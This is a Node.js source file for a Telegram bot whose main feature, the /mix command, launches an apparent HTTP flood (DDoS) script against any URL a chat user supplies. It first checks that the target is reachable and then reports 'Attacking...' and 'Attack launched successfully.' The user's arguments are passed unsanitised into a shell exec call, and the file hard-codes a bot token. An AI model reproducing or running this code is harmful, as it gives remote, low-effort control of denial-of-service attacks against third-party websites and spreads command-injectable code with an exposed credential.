const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const https = require('https');

const token = '7729532380:AAHQgIrbq7r6T23hhVU0zuE8UmsiEls6x-E';
const bot = new TelegramBot(token, { polling: true });

// === UTILS ===
const getManilaTime = () =>
  new Intl.DateTimeFormat('en-PH', {
    timeZone: 'Asia/Manila',
    dateStyle: 'full',
    timeStyle: 'medium',
  }).format(new Date());

const getPublicIP = (callback) => {
  https.get('https://api.ipify.org?format=json', (res) => {
    let data = '';
    res.on('data', (chunk) => (data += chunk));
    res.on('end', () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback('Error parsing IP');
      }
    });
  }).on('error', () => {
    callback('Unable to fetch IP');
  });
};

const checkHost = (target, callback) => {
  const url = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
  https.get(url, (res) => {
    if (res.statusCode === 200) {
      callback(true);
    } else {
      callback(false);
    }
  }).on('error', () => callback(false));
};

const logActivity = (msg) => {
  const user = msg.from;
  const command = msg.text?.toLowerCase();
  console.log(`[Bot Log] ${user.username || user.id} => ${command}`);
};

// === COMMAND HANDLERS ===
const handleStart = (chatId) => {
  const message = `
Welcome to the Telegram Bot!

Current Time: ${getManilaTime()}

Available Commands:
/mix [url] [time] [thread] [rate]
/show - Show author and time
/ip - Show public IP address
/uid - Your Telegram info
/help - Show all commands
  `;
  bot.sendMessage(chatId, message);
};

const handleHelp = (chatId) => {
  const msg = `
COMMAND LIST
───────────────────────────────
• /start – Start the bot
• /help – Show this help message
• /mix [url] [time] [thread] [rate] – Start mix attack
• /show – Show author info and current time
• /ip – Show server public IP
• /uid – Show your Telegram ID
───────────────────────────────
Time Zone: Asia/Manila
  `;
  bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
};

const handleShow = (chatId) => {
  bot.sendMessage(chatId, `Created by @yourusername\nTime: ${getManilaTime()}`);
};

const handleIP = (chatId) => {
  getPublicIP((ip) => {
    bot.sendMessage(chatId, `Public IP Address: ${ip}`);
  });
};

const handleUID = (chatId, user) => {
  bot.sendMessage(chatId, `Your ID: ${user.id}\nUsername: ${user.username || 'None'}`);
};

const handleMix = (chatId, args) => {
  const [url, time, thread, rate] = args;

  if (args.length !== 4 || !url || !time || !thread || !rate) {
    return bot.sendMessage(chatId, 'Invalid format. Use:\n/mix [url] [time] [thread] [rate]');
  }

  bot.sendMessage(chatId, `Checking target: ${url}...`);
  checkHost(url, (isUp) => {
    if (!isUp) {
      return bot.sendMessage(chatId, `Target ${url} is *not reachable*.`, { parse_mode: 'Markdown' });
    }

    bot.sendMessage(chatId, `
*Target:* ${url}
*Time:* ${time}
*Thread:* ${thread}
*Rate:* ${rate}

*Status:* Attacking...
    `, { parse_mode: 'Markdown' });

    exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
      if (error || stderr) {
        console.error(error || stderr);
        bot.sendMessage(chatId, 'Error occurred while starting the process.');
      } else {
        console.log(stdout);
        bot.sendMessage(chatId, 'Attack launched successfully.');
      }
    });
  });
};

// === BOT LISTENER ===
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();
  const command = text?.toLowerCase();
  const user = msg.from;

  if (!text) return;

  logActivity(msg);

  if (command === '/start') return handleStart(chatId);
  if (command === '/help') return handleHelp(chatId);
  if (command === '/show') return handleShow(chatId);
  if (command === '/ip') return handleIP(chatId);
  if (command === '/uid') return handleUID(chatId, user);
  if (command.startsWith('/mix')) {
    const args = text.split(' ').slice(1);
    return handleMix(chatId, args);
  }

  bot.sendMessage(chatId, 'Unknown command. Use /help to see available commands.');
});
